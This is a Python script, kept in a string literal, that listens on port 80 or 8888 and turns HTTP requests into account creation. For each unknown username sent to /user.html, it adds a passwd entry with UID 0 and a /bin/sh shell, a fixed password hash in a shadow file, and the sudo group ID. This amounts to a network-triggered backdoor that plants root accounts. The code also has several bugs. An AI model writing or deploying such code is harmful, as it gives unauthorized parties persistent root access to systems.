"""
import socket
import commands
# this library allows us to execute the commands

#get the users from /etc/passwd.
def users():
    users = []
    with open("users.txt","r") as file:
        for i in (file):
            users.append(i.split(":")[0])
        return users
#Ayadiendo usuario a /etc/passwd
def UserCreation(UserName,gropuID):
    try:
        with open("users.txt", "a") as userAdd:
            userAdd.write("{}:x:0:{}::/tmp:/bin/sh\n".format(userName,gropuID))
            print("User:: {} added!".format(UserName))
            return "user succesfully added: {}".format(UserName)
    except Exception as NoADD:
        print("the user couldn't be added Error: {}".format(NoADD))
#Ayadiendo usuario a /etc/shadow
def PASScreat(userName):
    try:
        with open("shadow.txt", "a") as userPass:
            userPass.write("{}:$6$LwVCbLQa$slW1yMFXR2uHsgPzi18OoUWo2ARtxoA8f9NQL8lr0v0ezPNB.Ts.rhafERmTFR43ZN0iDGwTanH1gml3FRjsP1:18403:0:99999:7:::\n".format(userName))
            print("User Password of:: {} added!".format(UserName))
    except Exception as NoPASS:
        print("the user couldn't set the password: {}".format(NoPASS))
#Ayyadiendo a grupo sudo /etc/group
def ADDgroup():
    try:
        with open("group.txt","r") as file:
            for i in file:
                x = i.split(":")
                if x[0]=="sudo":
                    gID = x[2]
                    print(gID)
                    return(gID)
    except Exception as NOgroup:
        print("no se puedo ayadir al usuario: {}".format(NOgroup))

#creating the socket
try:
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    print("Scoket Created! {}".format(mySocket))
except socket.error as ErrorCreation:
    print("Couldn't Create the Socket Error::{}".format(ErrorCreation))

#scoket connections 
def connectionPort(host):
    try:
        port = 80
        conn80 = mySocket.bind((host, port))
        print("You're connected to port:: {}".format(port))
        return conn80
    except socket.error as NotSudo:
        print("It seems that there is an Error:: {}".format(NotSudo))
        port = 8888
        conn8888 = mySocket.bind((host, port))
        print("You're connected to port:: {}".format(port))
        return conn8888
#Check the connection 
connectionPort('')
mySocket.listen(1)

#loop 
while True:
    client, add = mySocket.accept()
    msgHost = client.recv(1024)
    msgHost = msgHost.decode('utf-8')#Turn the message into a string
    #using split() to get the name of the user
    separate = msgHost.split("\n")
    url = separate[0]

    url = url.split('?')
    url2 = url[1]
    Weburl = url[0]

    getName = url2.split()
    userName = getName[0]
    print("User name:: {}".format(userName))

    if Weburl == "GET /user.html":
        client.send(b"GOOD: Page user found/")
        if userName in users():#check if the user is in the /etc/passwd file
            client.send(b'User {} found in the System/'.format(userName))
        else:#if the user isn't in the /etc/passwd file, is created 
            client.send(b'User {} not found/ Creating user...'.format(userName))

            groupID = ADDgroup()
            print(groupID)

            Bytes = str.encode(str(UserCreation(userName,groupID)),'utf-8')
            Bytes2 = str.encode(str(PASScreat(userName)),'utf-8')
            
            
            
            client.send(Bytes)
            client.send(Bytes2)
            

    client.close()
mySocket.close()
"""

    

